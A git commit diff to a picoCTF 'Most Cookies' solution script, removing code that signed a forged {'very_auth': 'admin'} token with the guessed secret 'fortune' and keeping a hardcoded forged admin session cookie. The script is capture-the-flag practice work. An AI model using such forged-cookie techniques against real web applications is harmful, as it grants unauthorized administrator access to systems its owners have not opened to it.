a692e4524eddad47211ae110b0ba713cc1a0f865
mizuirorivi <onodaha@gmail.com>
2023-03-14 08:29:51 -0400

    Update solve.py to remove unnecessary code and modify encoded jwt

--- picoCTF/web/Most_Cookies/solve.py
+++ picoCTF/web/Most_Cookies/solve.py
@@ -1,8 +1,6 @@
 import requests
 import jwt
 import re
-encoded_jwt = jwt.encode({'very_auth': 'admin'}, "fortune", algorithm="HS256")
-print(encoded_jwt)
 encoded_jwt = "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZBBjOg.M6F3uM1ohKprwQcwY-zyA8A28fI"
 #urlencode the jwt
 s = requests.Session() 
